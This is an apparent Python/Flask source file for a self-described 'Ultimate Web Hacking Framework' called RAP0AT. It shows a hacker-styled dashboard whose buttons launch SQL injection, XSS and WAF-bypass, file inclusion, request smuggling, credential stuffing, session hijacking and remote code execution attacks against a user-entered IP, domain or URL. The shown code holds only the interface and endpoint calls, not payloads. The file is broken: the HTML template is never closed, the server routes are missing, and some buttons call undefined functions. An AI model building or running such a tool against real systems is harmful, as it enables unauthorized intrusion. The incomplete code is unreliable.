#!/usr/bin/env python3                                                         
# Run it like: python3 AUTO.py                                           
# Requires: python3, nmap, requests, termcolor, colorama, flask, sqlmap, nuclei                                                           
                                                                           
import socket                                                            
import subprocess                                                        
import sys                                                               
import os                                                                
import re                                                                
import time                                                             
import threading                                                         
import json                                                              
import datetime                                                          
import random                                                            
import string                                                            
import requests                                                          
from urllib.parse import urlparse, quote, urlencode
from termcolor import colored                                            
import colorama                                                          
from flask import Flask, render_template_string, request, jsonify        
                                                                           
colorama.init()                                                          
                                                                           
# Web server setup                                                       
app = Flask(__name__)                                                    
                                                                           
# Hacker color scheme                                                    
BLACK = "\033[40m"                                                       
BLUE = "\033[34m"                                                        
CYAN = "\033[36m"                                                        
GREEN = "\033[32m"                                                       
RED = "\033[31m"                                                         
PURPLE = "\033[35m"                                                      
YELLOW = "\033[33m"                                                      
WHITE = "\033[37m"                                                       
RESET = "\033[0m"                                                        
                                                                           
class UltimateWebHackingFramework:                                       
    def __init__(self):                                                  
        self.target_ip = None                                            
        self.target_domain = None                                        
        self.target_url = None                                           
        self.session_start = datetime.datetime.now()                     
        self.all_results = []                                            
        self.exploit_db = []                                             
        self.downloaded_exploits = []                                    
        self.output_file = None                                          
        self.json_report = None                                          
        self.attack_counter = 0                                          
        self.is_attacking = False                                        
        self.attack_progress = 0                                         
        self.live_output = []                                            
                                                                           
        # Attack statistics                                              
        self.attack_stats = {                                            
            'sqli': 0, 'xss': 0, 'rce': 0, 'csrf': 0, 'lfi': 0, 'rfi':   
0,                                                                       
            'smuggling': 0, 'bruteforce': 0, 'enumeration': 0,           
'headers': 0,                                                            
            'authentication': 0, 'authorization': 0, 'session': 0,       
'injection': 0                                                           
        }                                                                
                                                                           
    def set_target(self, ip, domain, url=None):                          
        self.target_ip = ip                                              
        self.target_domain = domain                                      
        self.target_url = url                                            
        timestamp = self.session_start.strftime("%Y%m%d_%H%M%S")
        safe_ip = ip.replace('.', '_')
        self.output_file = f"AUTO_web_hacking_output_{safe_ip}_{timestamp}.txt"
        self.json_report = f"AUTO_web_hacking_report_{safe_ip}_{timestamp}.json"
                                                                           
        with open(self.output_file, 'w') as f:                           
            f.write("=" * 100 + "\n")                                    
            f.write("RAP0AT v1.0 - Ultimate Web Hacking Framework Output\n")
            f.write("Output\n")
            f.write("=" * 100 + "\n")                                    
            f.write(f"Target IP: {ip}\n")                                
            f.write(f"Target Domain: {domain or 'N/A'}\n")               
            f.write(f"Target URL: {url or 'N/A'}\n")                     
            f.write(f"Session Start: {self.session_start}\n")            
            f.write("=" * 100 + "\n\n")                                  
                                                                           
# Global framework instance                                              
web_framework = UltimateWebHackingFramework()                            
                                                                           
# COMPREHENSIVE HTML/CSS/JS TEMPLATE - Ultimate Hacker Interface         
ULTIMATE_HACKER_TEMPLATE = '''<!DOCTYPE html>                            
<html lang="en">                                                         
<head>                                                                   
    <meta charset="UTF-8">                                               
    <meta name="viewport" content="width=device-width,                   
initial-scale=1.0">                                                      
    <title>RAP0AT v1.0 - Ultimate Web Hacking Framework</title>         
    <style>                                                              
        * { margin: 0; padding: 0; box-sizing: border-box; }             
        body {                                                           
            background: #000; color: #00ff00; font-family: 'Courier      
New', monospace;                                                         
            overflow-x: hidden;                                          
        }                                                               
        .matrix-bg {                                                     
            position: fixed; top: 0; left: 0; width: 100%; height:       
100%;                                                                    
            opacity: 0.3; z-index: -1;                                   
            background: radial-gradient(ellipse at center, #00ff00 0%,   
#006600 50%, #002200 100%);                                              
            animation: matrixFlow 20s linear infinite;                   
        }                                                               
        @keyframes matrixFlow { 0% { background-position: 0 0; } 100% {  
background-position: 0 100%; } }                                         
        .grid { position: fixed; top: 0; left: 0; width: 100%; height:   
100%;                                                                    
            background-image: linear-gradient(rgba(0, 255, 0, 0.1) 1px,  
transparent 1px),
                            linear-gradient(90deg, rgba(0, 255, 0, 0.1)  
1px, transparent 1px);                                                   
            background-size: 50px 50px; opacity: 0.3; z-index: -1;       
            animation: gridMove 10s linear infinite;                     
        }                                                               
        @keyframes gridMove { 0% { transform: translate(0, 0); } 100% {  
transform: translate(50px, 50px); } }                                    
        .container { padding: 20px; max-width: 1400px; margin: 0 auto;   
}                                                                        
        .header {                                                        
            text-align: center; padding: 20px; border: 1px solid         
#00ff00;                                                                 
            border-radius: 10px; margin-bottom: 20px; background:        
rgba(0, 0, 0, 0.7);                                                      
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3); animation:        
headerGlow 2s ease-in-out infinite alternate;                            
        }                                                               
        @keyframes headerGlow { from { box-shadow: 0 0 10px rgba(0,      
255, 0, 0.3); } to { box-shadow: 0 0 30px rgba(0, 255, 0, 0.7); } }      
        .header h1 { color: #ff0000; font-size: 2.5em; text-shadow: 0 0  
10px #ff0000, 0 0 20px #ff0000; margin-bottom: 10px; animation:        
glitch 1s steps(2, end) infinite; }                                             
        @keyframes glitch { 0%, 100% { transform: translate(0); } 20% {  
transform: translate(-3px, 3px); } 40% { transform: translate(-3px,      
-3px); } 60% { transform: translate(3px, 3px); } 80% { transform:        
translate(3px, -3px); } }                                                
        .header h2 { color: #00ff00; font-size: 1.2em; text-shadow: 0 0  
5px #00ff00; }                                                           
        .status-bar {                                                    
            display: flex; justify-content: space-between; align-items:  
center;                                                                  
            background: rgba(0, 0, 0, 0.5); border: 1px solid #00ff00;   
border-radius: 5px; padding: 10px; margin-bottom: 20px;                  
        }                                                               
        .status-item { display: flex; flex-direction: column;            
align-items: center; }                                                   
        .status-item .label { font-size: 0.8em; color: #00ff00; }        
        .status-item .value { font-size: 1.2em; font-weight: bold;       
color: #ff0000; text-shadow: 0 0 5px #ff0000; }                          
        .target-form { display: grid; grid-template-columns: 1fr 1fr     
1fr auto; gap: 10px; margin-bottom: 20px; }                              
        .form-group { background: rgba(0, 0, 0, 0.7); border: 1px solid  
#00ff00; border-radius: 5px; padding: 10px; }                            
        .form-group label { display: block; color: #00ff00;              
margin-bottom: 5px; font-size: 0.9em; }                                  
        .form-group input, .form-group select { width: 100%; padding:    
10px; background: #000; color: #00ff00; border: 1px solid #00ff00;       
border-radius: 3px; font-family: 'Courier New', monospace; font-size:    
1em; }                                                                   
        .btn {                                                           
            padding: 15px 30px; background: #ff0000; color: #000;        
border: none; border-radius: 5px; cursor: pointer;                       
            font-family: 'Courier New', monospace; font-size: 1.1em;     
font-weight: bold; text-transform: uppercase;                            
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); transition: all   
0.3s; animation: btnPulse 2s ease-in-out infinite;                       
        }                                                               
        @keyframes btnPulse { 0%, 100% { box-shadow: 0 0 20px rgba(255,  
0, 0, 0.5); } 50% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.8); } }       
        .btn:hover { background: #00ff00; color: #000; box-shadow: 0 0   
30px rgba(0, 255, 0, 0.7); transform: scale(1.05); }                     
        .btn.secondary { background: #00ff00; color: #000; }             
        .btn.secondary:hover { background: #ff0000; color: #000; }       
        .dashboard { display: grid; grid-template-columns: 2.5fr 1.5fr;  
gap: 20px; margin-bottom: 20px; }                                        
        .panel {                                                         
            background: rgba(0, 0, 0, 0.7); border: 1px solid #00ff00;   
border-radius: 10px; padding: 20px;                                      
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3); animation:        
panelFadeIn 0.5s ease-in;                                                
        }                                                               
        @keyframes panelFadeIn { from { opacity: 0; transform:           
translateY(20px); } to { opacity: 1; transform: translateY(0); } }       
        .panel h3 { color: #00ff00; margin-bottom: 15px; text-shadow: 0  
0 5px #00ff00; border-bottom: 1px solid #00ff00; padding-bottom: 10px;   
}                                                                        
        .target-info { display: grid; grid-template-columns: repeat(3,   
1fr); gap: 10px; }                                                       
        .info-card { background: #000; border: 1px solid #00ff00;        
border-radius: 5px; padding: 15px; transition: all 0.3s; }               
        .info-card:hover { box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);    
transform: translateY(-2px); }                                           
        .info-card h4 { color: #ff0000; margin-bottom: 10px;             
text-shadow: 0 0 5px #ff0000; }                                          
        .info-card p { color: #00ff00; font-family: 'Courier New',       
monospace; }                                                             
        .progress-bar { width: 100%; height: 30px; background: #000;     
border: 1px solid #00ff00; border-radius: 5px; overflow: hidden;         
margin: 15px 0; position: relative; }                                    
        .progress-fill { height: 100%; background:                       
linear-gradient(90deg, #00ff00, #00ff88); width: 0%; transition: width   
0.5s; animation: progressGlow 2s ease-in-out infinite; }                 
        @keyframes progressGlow { 0%, 100% { box-shadow: 0 0 10px        
rgba(0, 255, 0, 0.5); } 50% { box-shadow: 0 0 20px rgba(0, 255, 0,       
0.8); } }                                                                
        .progress-text { color: #00ff00; text-align: center;             
margin-top: 5px; font-family: 'Courier New', monospace; }                
                                                                         
        /* Attack Categories */                                          
        .attack-categories { display: grid; grid-template-columns:       
repeat(2, 1fr); gap: 15px; }                                             
        .category-section { background: #000; border: 1px solid          
#00ff00; border-radius: 5px; padding: 15px; margin-bottom: 15px; }       
        .category-title { color: #ff0000; font-size: 1.1em;              
margin-bottom: 10px; text-shadow: 0 0 5px #ff0000; }                     
        .attack-grid { display: grid; grid-template-columns: repeat(3,   
1fr); gap: 10px; }                                                       
        .attack-btn { padding: 10px; background: #000; color: #00ff00;   
border: 1px solid #00ff00; border-radius: 3px; cursor: pointer;          
font-family: 'Courier New', monospace; font-size: 0.8em; transition:     
all 0.3s; text-align: center; }                                          
        .attack-btn:hover { background: #00ff00; color: #000;            
box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); transform: scale(1.02); }     
        .attack-btn.red { border-color: #ff0000; color: #ff0000; }       
        .attack-btn.red:hover { background: #ff0000; color: #000; }      
        .attack-btn.green { border-color: #00ff00; color: #00ff00; }     
        .attack-btn.green:hover { background: #00ff00; color: #000; }    
        .attack-btn.blue { border-color: #0088ff; color: #0088ff; }      
        .attack-btn.blue:hover { background: #0088ff; color: #000; }     
        .attack-btn.purple { border-color: #aa00ff; color: #aa00ff; }    
        .attack-btn.purple:hover { background: #aa00ff; color: #000; }   
                                                                         
        .live-output { height: 400px; overflow-y: auto; background:      
#000; border: 1px solid #00ff00; border-radius: 5px; padding: 15px;      
font-family: 'Courier New', monospace; font-size: 0.9em; }               
        .output-line { margin-bottom: 5px; padding: 5px; border-radius:  
3px; animation: fadeIn 0.5s; border-left: 3px solid transparent; }       
        @keyframes fadeIn { from { opacity: 0; transform:                
translateY(10px); } to { opacity: 1; transform: translateY(0); } }       
        .output-line.success { background: rgba(0, 255, 0, 0.1);         
border-left-color: #00ff00; }                                            
        .output-line.failure { background: rgba(255, 0, 0, 0.1);         
border-left-color: #ff0000; }                                            
        .output-line.attack { background: rgba(255, 0, 0, 0.1);          
border-left-color: #ff0000; }                                            
        .output-line.info { background: rgba(0, 255, 255, 0.1);          
border-left-color: #00ffff; }                                            
                                                                         
        .stats { display: grid; grid-template-columns: repeat(7, 1fr);   
gap: 10px; }                                                             
        .stat-card { background: #000; border: 1px solid #00ff00;        
border-radius: 5px; padding: 15px; text-align: center; transition: all   
0.3s; }                                                                  
        .stat-card:hover { box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);    
transform: translateY(-2px); }                                           
        .stat-card h4 { color: #ff0000; margin-bottom: 10px;             
text-shadow: 0 0 5px #ff0000; }                                          
        .stat-card .value { font-size: 1.5em; font-weight: bold; color:  
#00ff00; text-shadow: 0 0 5px #00ff00; }                                 
                                                                         
        .footer { text-align: center; padding: 20px; color: #00ff00;     
border-top: 1px solid #00ff00; margin-top: 20px; }                       
        .blink { animation: blink 1s infinite; }                         
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3;  
} }                                                                      
        .terminal-text { animation: terminalBlink 0.5s ease-in-out       
infinite; }                                                              
        @keyframes terminalBlink { 0%, 100% { color: #00ff00;            
text-shadow: 0 0 5px #00ff00; } 50% { color: #00ff88; text-shadow: 0 0   
10px #00ff88; } }                                                        
                                                                         
        @media (max-width: 1200px) { .dashboard {                        
grid-template-columns: 1fr; } .attack-grid { grid-template-columns:      
repeat(2, 1fr); } }                                                      
        @media (max-width: 768px) { .target-form {                       
grid-template-columns: 1fr; } .attack-grid { grid-template-columns:      
1fr; } .stats { grid-template-columns: repeat(2, 1fr); } }               
    </style>                                                             
</head>                                                                  
<body>                                                                   
    <div class="matrix-bg"></div>                                        
    <div class="grid"></div>                                             
    <div class="container">                                              
        <div class="header">                                             
            <h1 class="blink">⚡ RAP0AT v1.0 ⚡</h1>                    
            <h2 class="terminal-text">Ultimate Web Hacking Framework -   
All Attack Methods</h2>                                                  
            <p class="blink">Bypassing WAFs, exploiting                  
vulnerabilities, compromising systems...</p>                             
        </div>                                                           
        <div class="status-bar">                                         
            <div class="status-item"><div class="label">Target           
IP</div><div class="value" id="statusIP">Not Set</div></div>             
            <div class="status-item"><div class="label">Target           
Domain</div><div class="value" id="statusDomain">Not Set</div></div>     
            <div class="status-item"><div class="label">Target           
URL</div><div class="value" id="statusURL">Not Set</div></div>           
            <div class="status-item"><div class="label">Attack           
Status</div><div class="value" id="statusAttack">STANDBY</div></div>     
            <div class="status-item"><div class="label">Total            
Attacks</div><div class="value" id="statusTotal">0</div></div>           
            <div class="status-item"><div class="label">Success          
Rate</div><div class="value" id="statusRate">0%</div></div>              
        </div>                                                           
        <form class="target-form" id="targetForm">                       
            <div class="form-group"><label for="targetIP">Target IP      
Address</label><input type="text" id="targetIP" placeholder="Enter IP    
(e.g., 192.168.1.1)"></div>                                     
            <div class="form-group"><label for="targetDomain">Target     
Domain (Optional)</label><input type="text" id="targetDomain"            
placeholder="Enter domain (e.g., example.com)"></div>                    
            <div class="form-group"><label for="targetURL">Target URL    
(Optional)</label><input type="text" id="targetURL" placeholder="Enter   
URL (e.g., http://example.com)"></div>                                   
            <button type="submit" class="btn">🎯 Initialize              
Target</button>                                                          
        </form>                                                          
        <div class="dashboard">                                          
            <div class="panel">                                          
                <h3>🎯 Target Configuration</h3>                         
                <div class="target-info">                                
                    <div class="info-card"><h4>📡 Target IP</h4><p       
id="targetIPDisplay">Not Set</p></div>                                   
                    <div class="info-card"><h4>🌐 Target Domain</h4><p   
id="targetDomainDisplay">Not Set</p></div>                               
                    <div class="info-card"><h4>🔗 Target URL</h4><p      
id="targetURLDisplay">Not Set</p></div>                                  
                </div>                                                   
                <h3>⚡ Attack Progress</h3>                              
                <div class="progress-bar"><div class="progress-fill"     
id="progressFill"></div></div>                                           
                <div class="progress-text" id="progressText">0%          
Complete</div>                                                           
                                                                         
                <h3>🎮 Ultimate Web Attack Suite</h3>                    
                                                                         
                <!-- SQL Injection Category -->                          
                <div class="category-section">                           
                    <div class="category-title">💉 SQL Injection         
Attacks</div>                                                            
                    <div class="attack-grid">                            
                        <button class="attack-btn red"                   
onclick="startSQLInjection()">SQL Injection</button>                     
                        <button class="attack-btn red"                   
onclick="startBooleanBlindSQLi()">Boolean Blind SQLi</button>            
                        <button class="attack-btn red"                   
onclick="startTimeBasedSQLi()">Time-Based SQLi</button>                  
                        <button class="attack-btn red"                   
onclick="startErrorBasedSQLi()">Error-Based SQLi</button>                
                        <button class="attack-btn red"                   
onclick="startUnionBasedSQLi()">Union-Based SQLi</button>                
                        <button class="attack-btn red"                   
onclick="startStackedQueriesSQLi()">Stacked Queries SQLi</button>        
                    </div>                                               
                </div>                                                   
                                                                         
                <!-- XSS Category -->                                    
                <div class="category-section">                           
                    <div class="category-title">🎭 Cross-Site Scripting  
(XSS)</div>                                                              
                    <div class="attack-grid">                            
                        <button class="attack-btn green"                 
onclick="startReflectedXSS()">Reflected XSS</button>                     
                        <button class="attack-btn green"                 
onclick="startStoredXSS()">Stored XSS</button>                           
                        <button class="attack-btn green"                 
onclick="startDOMXSS()">DOM-Based XSS</button>                           
                        <button class="attack-btn green"                 
onclick="startBlindXSS()">Blind XSS</button>                             
                        <button class="attack-btn green"                 
onclick="startXSSWAFBypass()">XSS WAF Bypass</button>                    
                        <button class="attack-btn green"                 
onclick="startXSSPolyglots()">XSS Polyglots</button>                     
                    </div>                                               
                </div>                                                   
                                                                         
                <!-- LFI/RFI Category -->                                
                <div class="category-section">                           
                    <div class="category-title">📁 File Inclusion        
Attacks</div>                                                            
                    <div class="attack-grid">                            
                        <button class="attack-btn blue"                  
onclick="startLFIScan()">Local File Inclusion</button>                   
                        <button class="attack-btn blue"                  
onclick="startRFIScan()">Remote File Inclusion</button>                  
                        <button class="attack-btn blue"                  
onclick="startLFIPathTrav()">LFI Path Traversal</button>                 
                        <button class="attack-btn blue"                  
onclick="startLFIWrapper()">LFI Wrapper</button>                         
                        <button class="attack-btn blue"                  
onclick="startLFIEnconding()">LFI Encoding</button>                      
                        <button class="attack-btn blue"                  
onclick="startPHPFilter()">PHP Filter Attack</button>                    
                    </div>                                               
                </div>                                                   
                                                                         
                <!-- HTTP Smuggling Category -->                         
                <div class="category-section">                           
                    <div class="category-title">📦 HTTP Smuggling</div>  
                    <div class="attack-grid">                            
                        <button class="attack-btn purple"                
onclick="startHTTPSmuggling()">HTTP Request Smuggling</button>           
                        <button class="attack-btn purple"                
onclick="startCLTEAttack()">CL.TE Smuggling</button>                     
                        <button class="attack-btn purple"                
onclick="startTECLAttack()">TE.CL Smuggling</button>                     
                        <button class="attack-btn purple"                
onclick="startSmugglingCaching()">Smuggling + Caching</button>           
                        <button class="attack-btn purple"                
onclick="startSmugglingWAF()">Smuggling WAF Bypass</button>              
                        <button class="attack-btn purple"                
onclick="startResponseSplitting()">HTTP Response Splitting</button>      
                    </div>                                               
                </div>                                                   
                                                                         
                <!-- Authentication/Authorization Category -->           
                <div class="category-section">                           
                    <div class="category-title">🔑 Auth &                
Authorization</div>                                                      
                    <div class="attack-grid">                            
                        <button class="attack-btn"                       
onclick="startBruteForce()">Brute Force</button>                         
                        <button class="attack-btn"                       
onclick="startCredentialStuffing()">Credential Stuffing</button>         
                        <button class="attack-btn"                       
onclick="startSessionHijacking()">Session Hijacking</button>             
                        <button class="attack-btn"                       
onclick="startSessionFixation()">Session Fixation</button>               
                        <button class="attack-btn"                       
onclick="startCSRFAttack()">CSRF Attack</button>                         
                        <button class="attack-btn"                       
onclick="startAuthBypass()">Authentication Bypass</button>               
                    </div>                                               
                </div>                                                   
                                                                         
                <!-- Advanced Attacks Category -->                       
                <div class="category-section">                           
                    <div class="category-title">💣 Advanced              
Exploits</div>                                                           
                    <div class="attack-grid">                            
                        <button class="attack-btn red"                   
onclick="startRCEAttack()">Remote Code Execution</button>                
                        <button class="attack-btn green"                 
onclick="startCommandInjection()">Command Injection</button>             
                        <button class="attack-btn blue"                  
onclick="startPathTraversal()">Path Traversal</button>                   
                        <button class="attack-btn purple"                
onclick="startSSRFAttack()">Server Side Request Forgery</button>         
                        <button class="attack-btn"                       
onclick="startXXEAttack()">XML External Entity</button>                  
                        <button class="attack-btn"                       
onclick="startInsecureDeserialization()">Insecure                        
Deserialization</button>                                                 
                    </div>                                               
                </div>                                                   
                                                                         
                <!-- Enumeration & Recon Category -->                    
                <div class="category-section">                           
                    <div class="category-title">🔎 Enumeration &         
Recon</div>                                                              
                    <div class="attack-grid">                            
                        <button class="attack-btn"                       
onclick="startSubdomainEnum()">Subdomain Enumeration</button>            
                        <button class="attack-btn"                       
onclick="startDirectoryBruteforce()">Directory Bruteforce</button>       
                        <button class="attack-btn"                       
onclick="startPortScan()">Port Scanning</button>                         
                        <button class="attack-btn"                       
onclick="startTechDetection()">Technology Detection</button>             
                        <button class="attack-btn"                       
onclick="startHeaderAnalysis()">HTTP Header Analysis</button>            
                        <button class="attack-btn"                       
onclick="startCertificateAnalysis()">SSL Certificate Analysis</button>   
                    </div>                                               
                </div>                                                   
                                                                         
                <!-- Ultimate Attacks -->                                
                <div class="category-section">                           
                    <div class="category-title">🔥 Ultimate Web          
Hacking</div>                                                            
                    <div class="attack-grid">                            
                        <button class="attack-btn red"                   
onclick="startCompleteWebScan()">Complete Web Scan</button>              
                        <button class="attack-btn green"                 
onclick="startOWASPTop10()">OWASP Top 10</button>                        
                        <button class="attack-btn blue"                  
onclick="startZeroDayHunt()">Zero-Day Hunting</button>                   
                        <button class="attack-btn purple"                
onclick="startWAFBypassSuite()">WAF Bypass Suite</button>                
                        <button class="attack-btn"                       
onclick="startAutomatedExploitation()">Automated Exploitation</button>   
                        <button class="attack-btn"                       
onclick="startMaximumAggression()">Maximum Aggression</button>           
                    </div>                                               
                </div>                                                   
            </div>                                                       
                                                                         
            <div class="panel">                                          
                <h3>📊 Attack Statistics</h3>                            
                <div class="stats">                                      
                    <div class="stat-card"><h4>💉 SQLi</h4><div          
class="value" id="statSQLi">0</div></div>                                
                    <div class="stat-card"><h4>🎭 XSS</h4><div           
class="value" id="statXSS">0</div></div>                                 
                    <div class="stat-card"><h4>📁 LFI/RFI</h4><div       
class="value" id="statLFI">0</div></div>                                 
                    <div class="stat-card"><h4>📦 Smuggling</h4><div     
class="value" id="statSmuggling">0</div></div>                           
                    <div class="stat-card"><h4>🔑 Auth</h4><div          
class="value" id="statAuth">0</div></div>                                
                    <div class="stat-card"><h4>💣 RCE</h4><div           
class="value" id="statRCE">0</div></div>                                 
                    <div class="stat-card"><h4>🎯 Total</h4><div         
class="value" id="statTotal">0</div></div>                               
                </div>                                                   
                                                                         
                <h3 style="margin-top: 20px;">⚡ Quick Actions</h3>      
                <div class="attack-grid">                                
                    <button class="attack-btn secondary"                 
onclick="stopAttacks()">🛑 Stop Attacks</button>                         
                    <button class="attack-btn secondary"                 
onclick="saveReport()">📄 Save Report</button>                           
                    <button class="attack-btn secondary"                 
onclick="clearOutput()">🧹 Clear Output</button>                         
                    <button class="attack-btn secondary"                 
onclick="exportResults()">💾 Export Results</button>                     
                </div>                                                   
            </div>                                                       
        </div>                                                           
                                                                         
        <div class="panel">                                              
            <h3>📡 Live Output</h3>                                      
            <div class="live-output" id="liveOutput"></div>              
        </div>                                                           
                                                                         
        <div class="footer">                                             
            <p class="terminal-text">⚡ RAP0AT v1.0 - Ultimate Web      
Hacking Framework Active ⚡</p>                                          
            <p>Warning: This tool is for authorized security testing     
only</p>                                                                 
        </div>                                                           
    </div>                                                               
                                                                         
    <script>
        let isAttacking = false;
        let attackProgress = 0;

        function updateOutput(message, type = 'info') {
            const output = document.getElementById('liveOutput');
            const line = document.createElement('div');
            line.className = `output-line ${type}`;
            const time = new Date().toLocaleTimeString();
            line.innerHTML = `[${time}] ${message}`;
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
            fetch('/api/output', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message, type, time })
            });
        }

        function setTarget(ip, domain, url) {
            document.getElementById('targetIPDisplay').textContent = ip || 'Not Set';
            document.getElementById('targetDomainDisplay').textContent = domain || 'Not Set';
            document.getElementById('targetURLDisplay').textContent = url || 'Not Set';
            document.getElementById('statusIP').textContent = ip || 'Not Set';
            document.getElementById('statusDomain').textContent = domain || 'Not Set';
            document.getElementById('statusURL').textContent = url || 'Not Set';
            updateOutput(`Target configured: IP=${ip || 'N/A'}, Domain=${domain || 'N/A'}, URL=${url || 'N/A'}`, 'success');
        }

        function updateProgress(progress) {
            attackProgress = progress;
            document.getElementById('progressFill').style.width = progress + '%';
            document.getElementById('progressText').textContent = progress + '% Complete';
        }

        function updateStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('statSQLi').textContent = data.attack_stats.sqli;
                    document.getElementById('statXSS').textContent = data.attack_stats.xss;
                    document.getElementById('statLFI').textContent = data.attack_stats.lfi;
                    document.getElementById('statSmuggling').textContent = data.attack_stats.smuggling;
                    document.getElementById('statAuth').textContent = data.attack_stats.authentication;
                    document.getElementById('statRCE').textContent = data.attack_stats.rce;
                    document.getElementById('statTotal').textContent = data.total_attacks;
                    document.getElementById('statusTotal').textContent = data.total_attacks;
                    document.getElementById('statusRate').textContent = data.success_rate + '%';
                });
        }

        function updateAttackStatus(status) {
            document.getElementById('statusAttack').textContent = status;
            updateOutput(`Attack Status: ${status}`, 'info');
        }

        document.getElementById('targetForm').addEventListener('submit', function(e) {
            e.preventDefault();
            console.log("Initialize Target button clicked.");
            const ip = document.getElementById('targetIP').value;
            const domain = document.getElementById('targetDomain').value;
            const url = document.getElementById('targetURL').value;
            console.log("Form values:", { ip, domain, url });
            if (!ip && !domain && !url) {
                updateOutput('Error: Please enter a target IP, domain, or URL', 'failure');
                console.error("All target fields are empty.");
                return;
            }
            updateAttackStatus('INITIALIZING');
            console.log("Fetching /api/target...");
            fetch('/api/target', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, domain, url })
            })
            .then(response => {
                console.log("Received response from /api/target:", response);
                if (!response.ok) {
                    console.error("Response not OK:", response.status, response.statusText);
                    return response.json().then(errData => {
                        throw new Error(errData.message || "Unknown error from server");
                    });
                }
                return response.json();
            })
            .then(data => {
                console.log("Data from /api/target:", data);
                if (data.success) {
                    setTarget(data.ip, data.domain, data.url);
                    updateAttackStatus('READY');
                    updateOutput('Target initialization complete. Starting full scan...', 'success');
                    console.log("Starting complete web scan...");
                    startCompleteWebScan();
                } else {
                    updateAttackStatus('ERROR');
                    updateOutput(`Error: ${data.message}`, 'failure');
                    console.error("API error:", data.message);
                }
            })
            .catch(error => {
                console.error("Fetch error:", error);
                updateAttackStatus('ERROR');
                updateOutput(`Error: ${error.message}`, 'failure');
            });
        });

        // Attack Functions
        function startSQLInjection() { updateOutput('Initiating SQL Injection...', 'attack'); fetch('/api/attack/sqli', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('SQL Injection Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startBooleanBlindSQLi() { updateOutput('Initiating Boolean Blind SQL Injection...', 'attack'); fetch('/api/attack/boolean-blind-sqli', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Boolean Blind SQLi Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startTimeBasedSQLi() { updateOutput('Initiating Time-Based SQL Injection...', 'attack'); fetch('/api/attack/time-based-sqli', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Time-Based SQLi Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startErrorBasedSQLi() { updateOutput('Initiating Error-Based SQL Injection...', 'attack'); fetch('/api/attack/error-based-sqli', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Error-Based SQLi Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startUnionBasedSQLi() { updateOutput('Initiating Union-Based SQL Injection...', 'attack'); fetch('/api/attack/union-based-sqli', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Union-Based SQLi Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startStackedQueriesSQLi() { updateOutput('Initiating Stacked Queries SQL Injection...', 'attack'); fetch('/api/attack/stacked-queries-sqli', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Stacked Queries SQLi Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startReflectedXSS() { updateOutput('Initiating Reflected XSS...', 'attack'); fetch('/api/attack/reflected-xss', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Reflected XSS Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startStoredXSS() { updateOutput('Initiating Stored XSS...', 'attack'); fetch('/api/attack/stored-xss', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('Stored XSS Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startDOMXSS() { updateOutput('Initiating DOM-Based XSS...', 'attack'); fetch('/api/attack/dom-xss', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('DOM-Based XSS Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startXSSWAFBypass() { updateOutput('Initiating XSS WAF Bypass...', 'attack'); fetch('/api/attack/xss-waf-bypass', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('XSS WAF Bypass Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startLFIScan() { updateOutput('Initiating LFI Scan...', 'attack'); fetch('/api/attack/lfi', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('LFI Scan Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startRFIScan() { updateOutput('Initiating RFI Scan...', 'attack'); fetch('/api/attack/rfi', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('RFI Scan Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startLFIPathTrav() { updateOutput('Initiating LFI Path Traversal...', 'attack'); fetch('/api/attack/lfi-path-traversal', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('LFI Path Traversal Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startLFIWrapper() { updateOutput('Initiating LFI Wrapper Attack...', 'attack'); fetch('/api/attack/lfi-wrapper', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('LFI Wrapper Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startPHPFilter() { updateOutput('Initiating PHP Filter Attack...', 'attack'); fetch('/api/attack/php-filter', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('PHP Filter Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startHTTPSmuggling() { updateOutput('Initiating HTTP Smuggling...', 'attack'); fetch('/api/attack/http-smuggling', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('HTTP Smuggling Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
        function startCLTEAttack() { updateOutput('Initiating CL.TE Attack...', 'attack'); fetch('/api/attack/cl-te-smuggling', { method: 'POST' }).then(r => r.json()).then(d => { updateOutput('CL.TE Attack Complete', d.success ? 'success' : 'failure'); updateStats(); }); }
